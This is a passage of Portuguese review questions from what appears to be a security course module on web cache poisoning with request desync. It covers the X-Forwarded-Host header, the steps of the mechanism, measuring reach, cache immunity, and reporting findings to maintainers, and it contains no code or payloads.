7. **Por que o `X-Forwarded-Host` é clássico?**
8. **O que o desync acrescenta** ao poisoning?
9. **Cite as duas discordâncias** e por que o efeito é o produto.
10. **Cite os cinco passos** do mecanismo.
11. **O que o passo 4 multiplica?**
12. **O que o atacante escolhe?** Cite quatro.
13. **Por que o momento importa?**
14. **Cite as quatro medições** de alcance.
15. **Qual caracteriza o envenenamento?** Por quê?
16. **O que distingue reflexo de envenenamento?**
17. **O que tornaria o cache imune?**
18. **Por que o `Cache-Control` importa?**
19. **Quantos destinatários** tem um achado de cache? Por quê?
20. **O que cada mantenedor confirma?**

---

**Próximo:** [Módulo 9 — Encontrar a variante](modulo-09.md)
